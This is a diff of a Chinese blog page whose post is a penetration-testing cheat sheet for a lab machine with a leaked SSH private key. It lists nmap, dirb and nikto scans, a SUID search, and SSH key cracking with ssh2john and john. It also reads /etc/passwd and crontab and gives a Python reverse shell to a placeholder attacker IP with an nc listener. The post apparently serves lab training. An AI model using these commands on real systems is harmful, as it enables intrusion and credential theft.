@@ -253,25 +253,14 @@
       
         <h1 id="SSH私钥泄露"><a href="#SSH私钥泄露" class="headerlink" title="SSH私钥泄露"></a>SSH私钥泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>对于只是给定一个对应IP地址的靶场机器，我们需要对其进行扫描，探测开放的服务。渗透其实是针对服务的漏洞探测，然后进行相应的数据包发送，获取机器的最高权限。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">挖掘开放服务信息</span></span><br><span class="line">nmap -sV ip</span><br><span class="line"><span class="meta">#</span><span class="bash">探测靶场全部信息</span></span><br><span class="line">nmap -A -v ip</span><br><span class="line"><span class="meta">#</span><span class="bash">探测靶场的操作系统类型与版本</span></span><br><span class="line">nmap -O ip</span><br></pre></td></tr></table></figure>
-
 <span id="more"></span>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">探测服务的隐藏文件</span></span><br><span class="line">dirb http://ip:port</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">挖掘敏感信息</span></span><br><span class="line">nikto -host ip</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查找具有root权限的文件</span></span><br><span class="line">find /-perm -4000 2 &gt; /dev/null</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">通过ssh私钥登录</span></span><br><span class="line">ssh -i id_rsa user@ip</span><br><span class="line"><span class="meta">#</span><span class="bash">解密ssh密钥信息</span></span><br><span class="line">chmod 600 id_isa</span><br><span class="line"><span class="meta">#</span><span class="bash">转换ssh</span></span><br><span class="line">ssh2john id_isa &gt; isacrack</span><br><span class="line"><span class="meta">#</span><span class="bash">利用字典解密</span></span><br><span class="line">zcat ./rockyou.txt.gz | john --pipe --rule isacrack</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看所有用户的列表</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">查看用户组</span></span><br><span class="line">cat /etc/group</span><br><span class="line"><span class="meta">#</span><span class="bash">查看属于某些用户的文件</span></span><br><span class="line">find / -user username</span><br><span class="line"><span class="meta">#</span><span class="bash">查看缓冲文件目录</span></span><br><span class="line">/tmp</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">挖掘定时任务</span></span><br><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">反弹shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line">import os, subprocess, socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect(&quot;攻击机IP&quot;, &quot;攻击机监听端口&quot;)</span><br><span class="line">os.dup2(s.fileno(), 0)</span><br><span class="line">os.dup2(s.fileno(), 1)</span><br><span class="line">os.dup2(s.fileno(), 2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">攻击机netcat命令</span></span><br><span class="line">nc -lpv port</span><br><span class="line"><span class="meta">#</span><span class="bash">查看占用端口</span></span><br><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure>
-
-
-
 
     </div>
 
@@ -290,7 +279,7 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/11/04/ML-Algorithm-Pratice/ML-Algorithm-pratice-5/" rel="prev" title="机器学习算法竞赛实战(五)">
+    <a href="/2021/11/04/ML-Pratice/ML-Algorithm-pratice-5/" rel="prev" title="机器学习算法竞赛实战(五)">
       <i class="fa fa-chevron-left"></i> 机器学习算法竞赛实战(五)
     </a></div>
       <div class="post-nav-item">
